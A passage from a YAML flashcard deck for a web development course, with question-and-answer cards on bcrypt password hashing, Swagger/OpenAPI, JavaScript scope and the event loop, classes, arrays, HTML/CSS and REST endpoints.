              a cost factor of 10, bcrypt runs 2^10 = 1,024 iterations. A higher value makes each hash computation
              slower, which increases resistance to brute-force attacks.
            example: const hash = await bcrypt.hash(password, 10); // 10 is the cost factor
            source: Slide 11
            bloom: remember
          - id: password-hashing-card-02
            type: name
            prompt: Why should you hash passwords instead of encrypting them before storing them in a database?
            answer: >-
              Hashing is one-way — the server cannot reverse a hash, and no decryption key exists. Encryption is
              reversible: whoever holds the server's key can decrypt all stored passwords. If the server is compromised,
              an attacker gains the key and can recover every encrypted password. A hash breach exposes only hashes, not
              the original passwords.
            explanation: >-
              The fundamental property needed for password storage is irreversibility. Hashing provides that. Encryption
              does not — the decryption key always exists somewhere, and it lives on the same server as the data.
            example: >-
              Attacker breaches DB + server: encrypted passwords → decrypt with stolen key → all passwords exposed.
              Hashed passwords → only hashes → originals unrecoverable.
            source: Slide 9
            bloom: understand
          - id: password-hashing-card-03
            type: predict
            prompt: |
              What type does `h` have after this line, and how do you fix it?

              ```js
              const h = bcrypt.hash('secret', 10);
              ```
            answer: >-
              `h` is a Promise, not a hash string. Fix it by adding `await`: `const h = await bcrypt.hash('secret',
              10);`
            explanation: >-
              `bcrypt.hash()` is an asynchronous function — it returns a Promise. Without `await`, the variable receives
              the unresolved Promise object. Any subsequent `bcrypt.compare()` call against this value will return
              `false`, breaking all logins silently.
            example: |
              // Wrong — h is a Promise object
              const h = bcrypt.hash('secret', 10);

              // Correct — h is the hash string
              const h = await bcrypt.hash('secret', 10);
            source: Slide 11
            bloom: apply
            lang: js
          - id: password-hashing-card-04
            type: cloze
            prompt: "`bcrypt.compare(plaintext, hash)` returns a {{boolean}} — it never decrypts the hash."
            answer: boolean
            explanation: >-
              `bcrypt.compare()` hashes the submitted plaintext using the parameters embedded in the stored hash string
              and compares the result. It returns `true` if they match and `false` otherwise. The original password is
              never recovered — hashing is one-way by design.
            example: const match = await bcrypt.compare(req.body.password, user.password); // true or false
            source: Slide 11
            bloom: remember
          - id: password-hashing-card-05
            type: name
            prompt: >-
              What does a cost factor of 10 mean in `bcrypt.hash(password, 10)`, and why does a higher cost factor
              improve security?
            answer: >-
              A cost factor of 10 means bcrypt performs 2^10 = 1,024 internal hashing iterations to produce the final
              hash. A higher cost factor makes each hash computation slower. An attacker attempting millions of
              brute-force guesses per second pays the full computation cost for every guess, making large-scale attacks
              significantly more expensive.
            explanation: >-
              The cost factor is the work factor. Doubling it (e.g., from 10 to 11) doubles the computation time per
              hash. Legitimate users log in once and barely notice the delay. Attackers running billions of attempts are
              slowed proportionally.
            example: >-
              CF 10 → 2^10 = 1,024 iterations. CF 12 → 2^12 = 4,096 iterations. Same password, ~4x harder to
              brute-force.
            source: Slide 11
            bloom: understand
      - id: api-documentation
        name: API documentation with OpenAPI / Swagger
        tags:
          - swagger
          - OpenAPI
          - documentation
          - JSON
        prose: >-
          OpenAPI / Swagger is an Interface Description Language for describing RESTful APIs in a machine-readable JSON
          or YAML file (swagger.json). It documents endpoints, request parameters, request body schemas, response
          schemas, status codes, and authentication requirements. The starting point is the sample from
          editor.swagger.io; you customize the paths block in VS Code using the Swagger Viewer extension to preview the
          rendered docs.
        cards:
          - id: api-documentation-card-01
            type: cloze
            prompt: Swagger is an {{Interface Description Language}} for describing RESTful APIs expressed using JSON.
            answer: Interface Description Language
            explanation: >-
              The slide defines Swagger using the Wikipedia description: an Interface Description Language (IDL). IDLs
              describe the shape and contract of an interface — in this case, a REST API — independent of any specific
              implementation language.
            example: >-
              Just as an IDL for a library describes its function signatures, swagger.json describes an API's endpoint
              signatures.
            source: Slide 11
            bloom: remember
          - id: api-documentation-card-02
            type: name
            prompt: What format does a swagger.json file use?
            answer: JSON (or YAML) — a machine-readable specification format.
            explanation: >-
              OpenAPI / Swagger specs are written in JSON or YAML. The file is machine-readable, meaning tools like
              Swagger UI can parse it directly to render interactive documentation or generate client code without any
              additional human-authored prose.
            example: A swagger.json file stores endpoint definitions as nested JSON objects under the "paths" key.
            source: Slide 11
            bloom: remember
          - id: api-documentation-card-03
            type: name
            prompt: What is the starting point for creating a swagger.json for your project?
            answer: Download the sample from editor.swagger.io (File > Convert and Save as JSON), then customize it.
            explanation: >-
              Rather than writing a swagger.json from scratch, you download a valid, well-structured sample from
              editor.swagger.io. That sample provides the correct top-level skeleton (openapi, info, paths) so you only
              need to replace the example paths with your own endpoints.
            example: >-
              Open editor.swagger.io, go to File > Convert and Save as JSON, then open the file in VS Code and edit the
              paths block.
            source: Slide 11
            bloom: understand
          - id: api-documentation-card-04
            type: name
            prompt: What four things does an OpenAPI spec document about each endpoint?
            answer: Path, HTTP method, request schema (parameters or body), and response schema (status codes + body shape).
            explanation: >-
              Every entry in the paths block of a swagger.json covers: (1) the URL path, (2) the HTTP method (get, post,
              etc.), (3) the request shape — path/query parameters or a requestBody schema — and (4) the response
              definitions, mapping each status code to a description and optional body schema. Authentication is
              documented at the spec or operation level separately.
            example: >-
              A GET /patients entry names the path, specifies "get", lists any query params, and maps status 200 to a
              schema describing the returned patient array.
            source: Slide 11
            bloom: understand
          - id: api-documentation-card-05
            type: predict
            prompt: >
              A developer writes a `swagger.json` from scratch and gets this error from Swagger UI: "No operations
              defined in spec!" The file has this top-level structure:


              ```json

              { "info": { "title": "My API" }, "paths": {} }

              ```


              Identify two problems and state how to fix them.
            answer: >-
              1. Missing `openapi` version key — add `"openapi": "3.0.0"`. 2. Empty `paths` object — add at least one
              endpoint definition under `paths`. Start from the editor.swagger.io sample to get a valid skeleton.
            explanation: >-
              The `openapi` field declares the specification version and is required for Swagger UI to parse the file.
              An empty `paths` object is valid structure but produces no rendered endpoints. The editor.swagger.io
              sample includes both the `openapi` key and example paths, making it the correct starting point rather than
              writing from scratch.
            example: >
              // Minimal valid swagger.json:

              { "openapi": "3.0.0", "info": { "title": "My API", "version": "1.0.0" }, "paths": { "/patients": { "get":
              { "summary": "Get patients", "responses": { "200": { "description": "OK" } } } } } }
            source: Slide 11
            bloom: apply
            lang: json
  - id: m1-javascript-foundations
    name: JavaScript Foundations and Web Basics
    topics:
      - id: js-scope-hoisting
        name: var/let/const scope, hoisting, event loop
        tags:
          - hoisting
          - var
          - let
          - const
          - scope
          - block-scope
        prose: >-
          JavaScript hoists var declarations to the top of their enclosing function scope, initializing them to
          undefined. let and const are block-scoped and throw ReferenceError if accessed before their declaration line.
          Functions without a return statement return undefined. The event loop drains the microtask queue before
          picking the next macrotask.
        cards:
          - id: js-scope-hoisting-card-01
            type: cloze
            prompt: >-
              Declaring a variable with {{var}} hoists the declaration to the function top but NOT the initialization,
              so reading it before assignment returns {{undefined}}.
            answer: var; undefined
            explanation: >-
              The JavaScript compiler registers all var declarations in the function scope before execution. The
              assignment stays in place. So the variable exists but holds undefined until the assignment line runs.
            example: |
              console.log(x); // undefined, not ReferenceError
              var x = 5;
            source: Slide 1, ISAQuiz6
            bloom: remember
          - id: js-scope-hoisting-card-02
            type: cloze
            prompt: >-
              Accessing a {{let}} or {{const}} variable before its declaration line throws a {{ReferenceError}}, not
              undefined, because those declarations are in the Temporal Dead Zone.
            answer: let; const; ReferenceError
            explanation: >-
              let and const are block-scoped. They are processed during compilation but remain inaccessible (TDZ) until
              the declaration line executes. Reading them early is a hard error, unlike var which silently returns
              undefined.
            example: |
              console.log(a); // ReferenceError
              let a = 5;
            source: Slide 1, ISAQuiz6
            bloom: remember
          - id: js-scope-hoisting-card-03
            type: predict
            prompt: |
              Predict the output:
              ```js
              if (true) {
                let a = 5;
              }
              console.log(a);
              ```
            answer: "Uncaught ReferenceError: a is not defined"
            explanation: >-
              let is block-scoped to the if block. Once the block closes, a no longer exists in the outer scope.
              Accessing a outside throws ReferenceError, not undefined.
            example: |
              // The ReferenceError message: 'a is not defined'
              // var a = 5 inside the block would NOT throw — var is function-scoped
            source: ISAQuiz6 Q5
            bloom: apply
            lang: js
          - id: js-scope-hoisting-card-04
            type: predict
            prompt: |
              Predict the output:
              ```js
              if (m = []) {
                console.log("Green");
              }
              var m = 10;
              ```
            answer: Green
            explanation: >-
              var m is hoisted so m exists before the if. m = [] is an assignment expression evaluating to [] (truthy).
              The if body runs and prints Green.
            example: |
              // var m hoisted → m exists as undefined
              // m = [] assigns [] to m → [] is truthy
              // console.log('Green') runs
            source: ISAQuiz6 Q4
            bloom: apply
            lang: js
          - id: js-scope-hoisting-card-05
            type: predict
            prompt: |
              Predict the output:
              ```js
              function foo(n) {
                var s = 0;
                for (let i = 0; i < n; i++) {
                  s += i;
                }
              }
              console.log(foo(3));
              ```
            answer: undefined
            explanation: >-
              foo computes s internally but has no return statement. Every function that exits without return implicitly
              returns undefined.
            example: |
              // s = 3 is computed but never returned
              // foo(3) returns undefined → console.log prints undefined
            source: ISAQuiz6 Q6
            bloom: analyze
            lang: js
          - id: js-scope-hoisting-card-06
            type: name
            prompt: What is the order in which the JavaScript event loop processes task queues after the call stack empties?
            answer: Microtask queue (fully drained), then one macrotask, then microtask queue again.
            explanation: >-
              Promise .then() callbacks land in the microtask queue. setTimeout/setInterval callbacks land in the
              macrotask queue. The microtask queue always drains completely before the event loop picks the next
              macrotask.
            example: |
              // Resolve 10 Promises before setTimeout fires:
              // All 10 .then callbacks run before the setTimeout callback.
            source: Slide 3
            bloom: understand
          - id: js-scope-hoisting-card-07
            type: name
            prompt: var is function-scoped. What scope do let and const use?
            answer: Block scope — the nearest enclosing {}.
            explanation: >-
              Any pair of curly braces creates a block: if, for, while, or a bare {}. let and const declared inside a
              block are invisible outside it.
            example: |
              {
                let x = 5;
                const y = 10;
              }
              console.log(x); // ReferenceError
            source: Slide 1
            bloom: remember
          - id: js-scope-hoisting-card-08
            type: cloze
            prompt: >-
              A function that exits without a {{return}} statement implicitly returns {{undefined}}, regardless of any
              values computed internally.
            answer: return; undefined
            explanation: >-
              JavaScript automatically appends an implicit return undefined to every function that falls off the end.
              The caller receives undefined.
            example: |
              function compute() { var x = 9; }
              console.log(compute()); // undefined
            source: ISAQuiz6 Q6
            bloom: remember
      - id: js-async-event-loop
        name: Asynchronous JS, single-threaded non-blocking model, event queue
        tags:
          - async
          - event-loop
          - setTimeout
          - single-thread
          - non-blocking
        prose: >-
          JavaScript's single-threaded non-blocking model runs all code on one thread by delegating I/O to the OS and
          resuming via callbacks. The event loop drains the entire microtask queue before pulling the next macrotask, so
          Promise .then callbacks always execute before setTimeout callbacks when both are ready.
        cards:
          - id: js-async-event-loop-card-01
            type: cloze
            prompt: >-
              JavaScript is {{single-threaded non-blocking}}: one thread handles all requests by delegating I/O to the
              OS and resuming via callbacks.
            answer: single-threaded non-blocking
            explanation: >-
              One thread executes JS code. The thread never blocks on I/O because Node.js offloads I/O to the OS and
              receives a callback when done.
            example: |
              // Only one thing runs at a time, but I/O does not block execution
              // Node.js hands file reads to the OS and continues running other code
            source: Slide 4
            bloom: remember
          - id: js-async-event-loop-card-02
            type: name
            prompt: What is the JavaScript runtime mechanism that dequeues callbacks when the call stack is empty?
            answer: The event loop
            explanation: >-
              The event loop checks after each synchronous run-to-completion: drain all microtasks, then pull one
              macrotask. It repeats this cycle indefinitely.
            example: |
              // Event loop pseudo-code:
              // while (true) { drainMicrotaskQueue(); runOneMacrotask(); }
            source: Slide 4
            bloom: remember
          - id: js-async-event-loop-card-03
            type: predict
            prompt: |
              What is the output of this code?
              ```js
              setTimeout(function() { console.log(1); console.log(2); console.log(3); }, 500);
              console.log(4);
              ```
            answer: 4, then 1, 2, 3
            explanation: >-
              console.log(4) is synchronous and runs immediately. The setTimeout callback is a macrotask queued after at
              least 500 ms. The call stack must empty before any macrotask fires.
            example: |
              // Sync runs first, macrotasks run after the stack clears
            source: ISAQuiz6
            bloom: apply
            lang: js
          - id: js-async-event-loop-card-04
            type: predict
            prompt: |
              What is the output of this code?
              ```js
              setTimeout(function() { console.log(1); }, 1);
              new Promise(function(resolve) {
                console.log(2);
                resolve();
              }).then(function() { console.log(4); });
              console.log(3);
              ```
            answer: 2, 3, 4, 1
            explanation: >-
              Executor runs eagerly: 2 prints. resolve() enqueues .then as a microtask. console.log(3) runs sync. Stack
              empties then microtask drains (4). Macrotask fires last (1).
            example: |
              // Order: sync (2, 3) → microtask (4) → macrotask (1)
            source: ISAQuiz8
            bloom: apply
            lang: js
          - id: js-async-event-loop-card-05
            type: cloze
            prompt: >-
              The Promise executor runs {{eagerly}}: it executes immediately when `new Promise(executor)` is called,
              before any following synchronous statement.
            answer: eagerly
            explanation: >-
              Eager execution means the executor is not deferred. It runs synchronously on the call stack the instant
              the Promise is constructed.
            example: |
              new Promise((resolve) => {
                console.log('runs now'); // sync, not deferred
                resolve();
              });
              console.log('runs second');
              // Output: 'runs now', 'runs second'
            source: ISAQuiz8
            bloom: understand
          - id: js-async-event-loop-card-06
            type: name
            prompt: "Which queue drains completely before the next macrotask runs: microtask queue or macrotask queue?"
            answer: The microtask queue drains completely first.
            explanation: >-
              After the call stack empties, the event loop drains all pending microtasks (Promise .then callbacks)
              before pulling even one macrotask (setTimeout, I/O callback).
            example: |
              // If you resolve 10 Promises before a setTimeout fires,
              // all 10 .then callbacks run before the setTimeout callback.
            source: Slide 4, ISAQuiz8
            bloom: understand
          - id: js-async-event-loop-card-07
            type: predict
            prompt: |
              Which of the following are native async (Web API-backed) and which are synchronous?
              setTimeout / setInterval / forEach / console.log
            answer: setTimeout and setInterval are native async; forEach and console.log are synchronous.
            explanation: >-
              setTimeout and setInterval delegate to the runtime timer subsystem and return callbacks as macrotasks.
              forEach iterates inline on the call stack. console.log writes to stdout synchronously.
            example: |
              // forEach is NOT async even if you pass an async function to it
              [1,2,3].forEach(async (n) => { await doSomething(n); }); // Promises discarded
            source: ISAQuiz8
            bloom: analyze
            lang: js
          - id: js-async-event-loop-card-08
            type: cloze
            prompt: >-
              If a Promise executor never calls resolve() or reject(), the Promise stays {{pending}} and all attached
              .then() callbacks {{never run}}.
            answer: pending; never run
            explanation: >-
              Microtask callbacks only enqueue when the Promise transitions to fulfilled or rejected. A permanently
              pending Promise means its reaction callbacks are never dispatched.
            example: |
              new Promise((resolve) => {
                console.log(1); // runs
                // resolve never called
              }).then(() => console.log(2)); // never runs
              console.log(3); // runs
              // Output: 1, 3
            source: ISAQuiz8
            bloom: analyze
      - id: js-oop
        name: OOP in JS (classes, inheritance, composition)
        tags:
          - OOP
          - classes
          - extends
          - super
          - constructor
          - typeof
        prose: >-
          JavaScript provides three object-creation syntaxes: Object Literal, Constructor Function, and ES6 Class.
          Classes support inheritance via extends and super. typeof [] returns 'object', not 'array'. Computed property
          access uses a variable's value as the key.
        cards:
          - id: js-oop-card-01
            type: cloze
            prompt: "`typeof []` returns {{object}} in JavaScript, not array — arrays are objects."
            answer: object
            explanation: >-
              typeof tests the primitive type; it returns 'object' for any non-primitive, including arrays. Use
              Array.isArray() to check for arrays specifically. ISAQuiz4 tests this trap directly.
            example: |
              console.log(typeof []);          // 'object'
              console.log(Array.isArray([]));  // true
            source: ISAQuiz4
            bloom: remember
          - id: js-oop-card-02
            type: name
            prompt: What keyword must you call before using `this` in a subclass constructor?
            answer: "`super()` — omitting it throws a ReferenceError before `this` is accessible."
            explanation: >-
              super() invokes the parent constructor and initializes inherited properties. Until super() runs, this does
              not exist in the subclass constructor.
            example: |
              class Student extends Person {
                constructor(name, gpa) {
                  super(name); // must come first
                  this.gpa = gpa;
                }
              }
            source: Slide 1
            bloom: remember
          - id: js-oop-card-03
            type: cloze
            prompt: >-
              `let sandwich = { bread: 'white', filling: 'turkey' }` uses {{Object Literal}} syntax, not Constructor
              syntax.
            answer: Object Literal
            explanation: >-
              Object Literal syntax uses curly braces with key-colon-value pairs, no `new` keyword. Constructor syntax
              requires a function or class with `new`. ISAQuiz4 presents this as a multiple-choice trap.
            example: |
              let obj = { a: 1, b: 2 };        // Object Literal
              function Obj(a) { this.a = a; }
              let obj2 = new Obj(1);            // Constructor
            source: ISAQuiz4
            bloom: remember
          - id: js-oop-card-04
            type: predict
            prompt: |
              What does this code print?
              ```js
              let profile = { name: "Elon", gpa: 3.9 };
              let arr = ["name", "gpa", "id"];
              console.log(profile[arr[1]]);
              ```
            answer: "3.9"
            explanation: >-
              arr[1] evaluates to the string 'gpa'. profile['gpa'] returns 3.9. Computed property access uses the value
              of the expression inside [] as the key.
            example: |
              // arr[1] = 'gpa'
              // profile['gpa'] = 3.9
            source: ISAQuiz4
            bloom: apply
            lang: js
          - id: js-oop-card-05
            type: predict
            prompt: |
              What does this code print?
              ```js
              let obj = { a: 1, b: 2, c: 3 };
              console.log(obj["1"]);
              ```
            answer: undefined
            explanation: >-
              The object has keys 'a', 'b', 'c'. There is no key '1'. Accessing a non-existent key returns undefined,
              not an error.
            example: |
              let obj = { a: 1 };
              console.log(obj["a"]); // 1
              console.log(obj["z"]); // undefined
            source: ISAQuiz4
            bloom: apply
            lang: js
          - id: js-oop-card-06
            type: name
            prompt: What is wrong with the syntax `obj.[moreNums]`?
            answer: Invalid — dot and bracket notation cannot be combined. Use `obj.moreNums` or `obj[moreNums]`.
            explanation: >-
              Dot notation accesses a named property. Bracket notation evaluates the expression inside [] as the key.
              Mixing them is a syntax error. ISAQuiz4 tests this trap.
            example: |
              let key = "name";
              obj.name;   // valid dot notation
              obj[key];   // valid bracket notation
              obj.[key];  // SyntaxError
            source: ISAQuiz4
            bloom: understand
          - id: js-oop-card-07
            type: cloze
            prompt: In `class Student extends Person`, the keyword {{extends}} sets up prototype-chain inheritance.
            answer: extends
            explanation: >-
              extends wires Student's prototype to Person's prototype chain. Methods defined in Person become available
              on Student instances via prototype lookup.
            example: |
              class Animal { speak() { return 'noise'; } }
              class Dog extends Animal {}
              new Dog().speak(); // 'noise' — inherited
            source: Slide 1
            bloom: remember
          - id: js-oop-card-08
            type: predict
            prompt: |
              What does this code print?
              ```js
              class Person { constructor(name) { this.name = name; } }
              class Student extends Person {
                constructor(name, gpa) { super(name); this.gpa = gpa; }
              }
              let s = new Student("Ada", 4.0);
              console.log(s instanceof Person);
              ```
            answer: "true"
            explanation: >-
              Student extends Person, so Student's prototype chain includes Person.prototype. instanceof traverses the
              chain — any Student instance is also a Person instance.
            example: |
              // s instanceof Student → true
              // s instanceof Person  → true (prototype chain)
            source: Slide 1
            bloom: apply
            lang: js
      - id: js-functions
        name: Function declarations, callbacks, first-class functions, closures
        tags:
          - callbacks
          - higher-order
          - closures
          - return-types
          - parameter
          - argument
        prose: >-
          JavaScript functions are first-class values: assignable, passable, and returnable. Parameters are
          definition-site placeholders; arguments are call-site values. A function with no return statement returns
          undefined. A closure retains access to enclosing-scope variables after that scope exits.
        cards:
          - id: js-functions-card-01
            type: cloze
            prompt: >-
              A function's {{parameter}} is the variable name in the definition; the {{argument}} is the actual value
              passed at the call site.
            answer: parameter; argument
            explanation: >-
              These two terms are not synonyms. The definition declares parameters; the caller supplies arguments.
              COMP4537 quizzes test this distinction by name.
            example: |
              function greet(name) { return "Hi " + name; }  // name is the parameter
              greet("John");                                   // "John" is the argument
            source: ISAQuiz3
            bloom: remember
          - id: js-functions-card-02
            type: predict
            prompt: |
              What does this code print?
              ```js
              function foo(n) {
                var s = 0;
                for (let i = 0; i < n; i++) { s += i; }
              }
              console.log(foo(3));
              ```
            answer: undefined
            explanation: >-
              foo has no return statement. JavaScript implicitly returns undefined. The computed value of s is never
              exposed to the caller.
            example: |
              // s = 3 is computed but not returned
              // foo(3) returns undefined
            source: ISAQuiz3
            bloom: apply
            lang: js
          - id: js-functions-card-03
            type: predict
            prompt: |
              What does this code print?
              ```js
              function subtract(a, b) { return a - b; }
              console.log(subtract(23, 12) - subtract(10, 3));
              ```
            answer: "4"
            explanation: subtract(23,12) returns 11. subtract(10,3) returns 7. 11 - 7 = 4.
            example: |
              // subtract(23, 12) → 11
              // subtract(10, 3)  → 7
              // 11 - 7 = 4
            source: ISAQuiz3
            bloom: apply
            lang: js
          - id: js-functions-card-04
            type: predict
            prompt: |
              What does this code print?
              ```js
              function checkString(s) { return s === "John"; }
              checkString("John");
              ```
            answer: Nothing is printed.
            explanation: The function returns true, but the return value is discarded. No console.log exists at the call site.
            example: |
              // checkString("John") returns true
              // But no console.log — nothing is printed
            source: ISAQuiz3
            bloom: analyze
            lang: js
          - id: js-functions-card-05
            type: name
            prompt: What is a function that either accepts a function as an argument or returns a function called?
            answer: A higher-order function
            explanation: >-
              Array.map, Array.filter, and Array.forEach are examples. They accept a callback function as their
              argument.
            example: |
              // Array.map is a higher-order function
              [1, 2, 3].map(n => n * 2); // callback passed as argument
            source: Slide 3
            bloom: remember
          - id: js-functions-card-06
            type: cloze
            prompt: >-
              A {{closure}} is a function that retains access to variables from its {{enclosing scope}} after that scope
              has exited.
            answer: closure; enclosing scope
            explanation: >-
              The inner function in hiGenerator closes over greeting. Even after hiGenerator returns, greeting remains
              accessible through the closure's scope chain.
            example: |
              function hiGenerator(greeting) {
                return function(name) {
                  return greeting + ', ' + name;
                };
              }
              const sayHi = hiGenerator('Hello');
              console.log(sayHi('World')); // Hello, World
            source: ISAQuiz6
            bloom: understand
          - id: js-functions-card-07
            type: predict
            prompt: |
              What does this code print?
              ```js
              function tripleNumber(n) { return n * 3; }
              for (let i = 0; i < 4; i++) {
                console.log(tripleNumber(i));
              }
              ```
            answer: 0, 3, 6, 9 (each on a separate line)
            explanation: "i iterates 0, 1, 2, 3. tripleNumber multiplies each by 3: 0, 3, 6, 9."
            example: |
              // i=0: 0*3=0 / i=1: 1*3=3 / i=2: 2*3=6 / i=3: 3*3=9
            source: ISAQuiz3
            bloom: apply
            lang: js
          - id: js-functions-card-08
            type: name
            prompt: What term describes a function passed as an argument to another function, to be called later?
            answer: A callback
            explanation: >-
              The receiving higher-order function calls the callback — synchronously or asynchronously. Array.map's
              argument is a callback.
            example: |
              function doTwice(fn) { fn(); fn(); }
              doTwice(() => console.log('hi')); // callback passed as argument
            source: Slide 3
            bloom: remember
      - id: js-arrays-loops
        name: Arrays, loops, iteration patterns
        tags:
          - arrays
          - for-loop
          - iteration
          - index
          - break
          - continue
        prose: >-
          JavaScript arrays are sparse objects. Unassigned slots return undefined. Loop boundaries with <= instead of <
          cause an off-by-one that reads undefined on the last pass.
        cards:
          - id: js-arrays-loops-card-01
            type: predict
            prompt: "Predict the output: arr = []; arr[1] = 1234; console.log(arr[0]);"
            answer: undefined
            explanation: Index 0 was never assigned. Unassigned sparse slots return undefined, not an error.
            example: |
              let arr = [];
              arr[1] = 1234;
              console.log(arr[0]); // undefined
            source: ISAQuiz2
            bloom: apply
            lang: js
          - id: js-arrays-loops-card-02
            type: predict
            prompt: arr = ['a','b','c','d','e','f']; What does arr[arr.length / 2] return?
            answer: "'d'"
            explanation: "arr.length is 6. 6/2 = 3. arr[3] is 'd' (zero-indexed: a=0, b=1, c=2, d=3)."
            example: |
              const arr = ['a', 'b', 'c', 'd', 'e', 'f'];
              console.log(arr[arr.length / 2]); // arr[3] = 'd'
            source: ISAQuiz2
            bloom: apply
            lang: js
          - id: js-arrays-loops-card-03
            type: cloze
            prompt: >-
              Using `i <= arr.length` in a for-loop causes the last iteration to read arr[{{arr.length}}], which returns
              {{undefined}}.
            answer: arr.length; undefined
            explanation: >-
              arr.length is one past the last valid index. That slot does not exist and evaluates to undefined. Use `i <
              arr.length` to avoid this.
            example: |
              const arr = [1, 2, 3];
              for (let i = 0; i <= arr.length; i++) {
                console.log(arr[i]); // final pass: arr[3] = undefined
              }
            source: ISAQuiz2
            bloom: understand
          - id: js-arrays-loops-card-04
            type: predict
            prompt: How many lines does this print? for(let i=0;i<3;i++){for(let j=0;j<3;j++){console.log(i,j);}}
            answer: "9"
            explanation: Two nested loops each running 3 iterations produce 3 x 3 = 9 total iterations.
            example: |
              for (let i = 0; i < 3; i++) {
                for (let j = 0; j < 3; j++) {
                  console.log(i, j); // 9 lines total
                }
              }
            source: ISAQuiz2
            bloom: apply
            lang: js
          - id: js-arrays-loops-card-05
            type: name
            prompt: What term describes an array where some index slots were never assigned?
            answer: sparse array
            explanation: A sparse array has holes — integer keys that were skipped. Holes read as undefined.
            example: |
              let arr = [];
              arr[5] = 'hello';
              console.log(arr[0]); // undefined (hole at index 0)
            source: ISAQuiz2
            bloom: remember
          - id: js-arrays-loops-card-06
            type: predict
            prompt: "Predict the output: for(let i=0;i<5;i++){if(i===2)break; console.log(i);}"
            answer: 0, 1
            explanation: break fires when i===2 before console.log executes for that iteration. Only 0 and 1 are logged.
            example: |
              for (let i = 0; i < 5; i++) {
                if (i === 2) break;
                console.log(i); // 0, 1
              }
            source: ISAQuiz2
            bloom: apply
            lang: js
          - id: js-arrays-loops-card-07
            type: predict
            prompt: console.log(parseInt('Hello123')) — what does this return?
            answer: NaN
            explanation: >-
              parseInt reads left-to-right. The string starts with 'H', not a digit, so parsing fails immediately and
              returns NaN.
            example: |
              console.log(parseInt("Hello123")); // NaN
              console.log(parseInt("123Hello")); // 123
            source: ISAQuiz2
            bloom: apply
            lang: js
          - id: js-arrays-loops-card-08
            type: cloze
            prompt: Setting arr.length = 4 on a 6-element array {{deletes}} elements at index 4 and 5.
            answer: deletes
            explanation: Reducing arr.length truncates the array. Elements at the removed indices are permanently deleted.
            example: |
              const arr = [1, 2, 3, 4, 5, 6];
              arr.length = 4;
              console.log(arr); // [1, 2, 3, 4]
            source: ISAQuiz2
            bloom: understand
      - id: html-css-review
        name: HTML DOM structure, CSS box model, selectors, attributes
        tags:
          - HTML
          - CSS
          - DOM
          - box-model
          - selectors
          - attributes
        prose: >-
          The CSS box model layers every element in four concentric zones: content, padding, border, margin. Selectors
          target elements by type, class, or combination; commas group them, spaces express ancestry. The color property
          changes text color; background-color changes the background. HTML attributes use either single or double
          quotes.
        cards:
          - id: html-css-review-card-01
            type: cloze
            prompt: "The CSS box model layers from inside out are: {{content}}, {{padding}}, {{border}}, {{margin}}."
            answer: content; padding; border; margin
            explanation: >-
              The content layer holds text and child elements. Padding adds transparent space inside the border. The
              border wraps padding. Margin separates the element from its neighbors.
            example: |
              .box {
                padding: 10px;          /* inside border */
                border: 2px solid black;
                margin: 20px;           /* outside border */
              }
            source: ISAQuiz1
            bloom: remember
          - id: html-css-review-card-02
            type: cloze
            prompt: To change an element's background color in CSS, use the property {{background-color}}, not {{color}}.
            answer: background-color; color
            explanation: >-
              `color` changes text color. `background-color` changes the element's background. ISAQuiz1 tests this
              distinction directly.
            example: |
              p {
                color: black;             /* text is black */
                background-color: yellow; /* background is yellow */
              }
            source: ISAQuiz1
            bloom: remember
          - id: html-css-review-card-03
            type: cloze
            prompt: >-
              The CSS grouping selector `h1, h2, p { color: red; }` targets {{all three element types}}. Without the
              comma, `h1 h2 p` creates a {{descendant}} selector.
            answer: all three element types; descendant
            explanation: >-
              Commas group independent selectors. Spaces create descendant selectors — a completely different
              relationship.
            example: |
              h1, h2, p { color: red; }   /* grouping — all three */
              h1 h2 p { color: blue; }    /* descendant — p inside h2 inside h1 */
            source: ISAQuiz1
            bloom: understand
          - id: html-css-review-card-04
            type: cloze
            prompt: >-
              In HTML, `<!DOCTYPE html>` must appear {{before the <html> element}}. `<head>` and `<body>` are direct
              children of {{<html>}}.
            answer: before the <html> element; <html>
            explanation: >-
              The DOCTYPE declaration tells the browser which HTML version to parse. It is not an element and has no
              closing tag.
            example: |
              <!DOCTYPE html>
              <html>
                <head>...</head>
                <body>...</body>
              </html>
            source: ISAQuiz1
            bloom: remember
          - id: html-css-review-card-05
            type: name
            prompt: What two attributes does an `<img>` element use to specify the image file and its fallback text?
            answer: "`src` and `alt`"
            explanation: "`src` provides the file path or URL. `alt` provides text the browser displays when the image cannot load."
            example: |
              <img src="photo.jpg" alt="A red barn in a field">
            source: ISAQuiz1
            bloom: remember
          - id: html-css-review-card-06
            type: name
            prompt: What are the three ways to attach CSS to an HTML document?
            answer: External `<link>` in `<head>`, internal `<style>` in `<head>`, inline `style` attribute on an element
            explanation: >-
              External stylesheets are most maintainable. Internal styles scope to one page. Inline styles have the
              highest specificity.
            example: |
              <link rel="stylesheet" href="styles.css">  <!-- external -->
              <style>p { color: red; }</style>            <!-- internal -->
              <p style="color: red;">Text</p>             <!-- inline -->
            source: ISAQuiz1
            bloom: remember
          - id: html-css-review-card-07
            type: cloze
            prompt: The CSS selector `div.container` matches a {{<div> element that also has the class container}}.
            answer: <div> element that also has the class container
            explanation: >-
              No space between element and class name means both conditions apply to the same element. A space (`div
              .container`) creates a descendant relationship — a completely different rule requiring you to apply your
              knowledge of selector syntax to determine what is matched.
            example: |
              div.container { border: 1px solid; }  /* targets <div class='container'> */
              div .container { border: 1px solid; } /* targets .container inside a div */
            source: ISAQuiz1
            bloom: apply
          - id: html-css-review-card-08
            type: name
            prompt: Which CSS units are valid for specifying font size?
            answer: "`px`, `em`, and `%` are all valid CSS units for font size."
            explanation: >-
              `px` is absolute. `em` is relative to the parent element's font size. `%` is relative to the inherited
              font size. All three appear in ISAQuiz1.
            example: |
              p { font-size: 16px; }
              h2 { font-size: 1.5em; }
              small { font-size: 80%; }
            source: ISAQuiz1
            bloom: remember
  - id: m2-web-architecture
    name: Web Architecture and Data Exchange
    topics:
      - id: rest-anatomy
        name: Anatomy of Web APIs
        tags:
          - REST
          - API
          - endpoint
          - headers
          - HTTP-methods
          - status-codes
        prose: >-
          Anatomy of web APIs: endpoints, headers, HTTP methods (GET/POST/PUT/PATCH/DELETE/HEAD), idempotency, and
          status code ranges.
        cards:
          - id: rest-anatomy-card-01
            type: name
            prompt: What is an endpoint?
            answer: The URL where the API server is listening.
            explanation: >-
              The endpoint is the address you send your request to. Example: https://api.example.com/v1/patients/ — the
              server listens at this URL for incoming requests.
            example: "https://api.example.com/v1/patients/1/ is the endpoint for patient #1."
            source: Slide 3
            bloom: remember
          - id: rest-anatomy-card-02
            type: cloze
